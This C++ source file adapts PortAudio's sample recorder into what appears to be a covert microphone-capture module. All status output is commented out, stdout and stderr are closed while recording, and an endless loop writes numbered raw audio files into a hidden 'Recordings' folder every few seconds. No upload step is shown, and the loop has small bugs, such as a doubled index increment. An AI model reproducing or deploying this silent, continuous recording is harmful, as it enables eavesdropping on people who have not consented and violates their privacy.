#include "MicrophoneCapture.h"
#include "Util.h"

typedef struct {
	int		frameIndex;
	int		maxFrameIndex;
	SAMPLE	*recordedSamples;
} captureData;

static int recordCallback(
	const void* inputBuffer,
	void* outputBuffer,
	unsigned long framesPerBuffer,
	const PaStreamCallbackTimeInfo* timeInfo,
	PaStreamCallbackFlags statusFlags,
	void* userData)
{
	captureData* data = (captureData*)userData;
	const SAMPLE * rptr = (const SAMPLE*)inputBuffer;
	SAMPLE * wptr = &data->recordedSamples[data->frameIndex * NUM_CHANNELS];
	long framesToCalc;
	long i;
	int finished;
	unsigned long framesLeft = data->maxFrameIndex - data->frameIndex;
	
	(void)outputBuffer; /* Prevent unused variable warnings. */
	(void)timeInfo;
	(void)statusFlags;
	(void)userData;
	
	if (framesLeft < framesPerBuffer)
	{
		framesToCalc = framesLeft;
		finished = paComplete;
	}
	else
	{
		framesToCalc = framesPerBuffer;
		finished = paContinue;
	}
	
	if (inputBuffer == NULL)
	{
		for (i = 0; i < framesToCalc; i++)
        {
			*wptr++ = SAMPLE_SILENCE;  /* left */
			if (NUM_CHANNELS == 2) *wptr++ = SAMPLE_SILENCE;  /* right */
		}
	}
	else
	{
	    for (i = 0; i < framesToCalc; i++)
		{
			*wptr++ = *rptr++;  /* left */
			if (NUM_CHANNELS == 2) *wptr++ = *rptr++;  /* right */
		}
    }
	data->frameIndex += framesToCalc;
	return finished;
}

void recordMicrophone(std::wstring filename) {
	PaStreamParameters  inputParameters, outputParameters;
	PaStream* stream;
	PaError             err = paNoError;
	captureData         data;
	int                 i;
	int                 totalFrames;
	int                 numSamples;
	int                 numBytes;
	SAMPLE              max, val;
	double              average;

	// printf("patest_record.c\n");
	fflush(stdout);

	data.maxFrameIndex = totalFrames = NUM_SECONDS * SAMPLE_RATE; /* Record for a few seconds. */
	data.frameIndex = 0;
	numSamples = totalFrames * NUM_CHANNELS;
	numBytes = numSamples * sizeof(SAMPLE);
	data.recordedSamples = (SAMPLE*)malloc(numBytes); /* From now on, recordedSamples is initialised. */
	if (data.recordedSamples == NULL)
	{
		// printf("Could not allocate record array.\n");
		goto done;
	}

	for (i = 0; i < numSamples; i++) data.recordedSamples[i] = 0;

	err = Pa_Initialize();
	if (err != paNoError) goto done;

	inputParameters.device = Pa_GetDefaultInputDevice(); /* default input device */
	if (inputParameters.device == paNoDevice) {
		//fprintf(stderr, "Error: No default input device.\n");
		goto done;
	}

	inputParameters.channelCount = 2; /* stereo input */
	inputParameters.sampleFormat = PA_SAMPLE_TYPE;
	inputParameters.suggestedLatency = Pa_GetDeviceInfo(inputParameters.device)->defaultLowInputLatency;
	inputParameters.hostApiSpecificStreamInfo = NULL;

	err = Pa_OpenStream(
		&stream,
		&inputParameters,
		NULL,
		SAMPLE_RATE,
		FRAMES_PER_BUFFER,
		paClipOff,
		recordCallback,
		&data
	);

	if (err != paNoError) goto done;
	err = Pa_StartStream(stream);
	if (err != paNoError) goto done;

	// rintf("\n=== Now recording!! Please speak into the microphone. ===\n");
	fflush(stdout);

	while ((err = Pa_IsStreamActive(stream)) == 1)
	{
		Pa_Sleep(1000);
		// printf("index = %d\n", data.frameIndex); fflush(stdout);
	}

	if (err < 0) goto done;

	err = Pa_CloseStream(stream);
	if (err != paNoError) goto done;

	/* Measure maximum peak amplitude. */
	max = 0;
	average = 0.0;
	for (i = 0; i < numSamples; i++)
	{
		val = data.recordedSamples[i];
		if (val < 0) val = -val; /* ABS */
		if (val > max)
		{
			max = val;
		}

		average += val;
	}

	average = average / (double)numSamples;

	/* Write recorded data to a file. */
	FILE* fid;
	fid = _wfopen(filename.c_str(), L"wb");
	if (fid == NULL)
	{
		// printf("Could not open file.");
	}
	else
	{
		fwrite(data.recordedSamples, NUM_CHANNELS * sizeof(SAMPLE), totalFrames, fid);
		fclose(fid);
	}

done:
	Pa_Terminate();
	if (data.recordedSamples) free(data.recordedSamples);
	if (err != paNoError)
	{
		//fprintf(stderr, "An error occured while using the portaudio stream\n");
		// fprintf(stderr, "Error number: %d\n", err);
		// fprintf(stderr, "Error message: %s\n", Pa_GetErrorText(err));
		err = 1; /* Always return 0 or 1, but no other return codes. */
	}
}

void startMicrophoneCapture() {
	std::wstring outFolder = getOutFolder() + L"\\Recordings";
	createFolderIfNotExist(outFolder);
	int index = 0;

	while (1) {
		Sleep(3000);
		
		std::wstring outPath = outFolder + L"\\Recordings" + std::to_wstring(index++) + L".raw";
		
		fclose(stdout);
		fclose(stderr);
		recordMicrophone(outPath);
		freopen("CON", "w", stdout);
		freopen("CON", "w", stderr);
		
		index++;
	}
}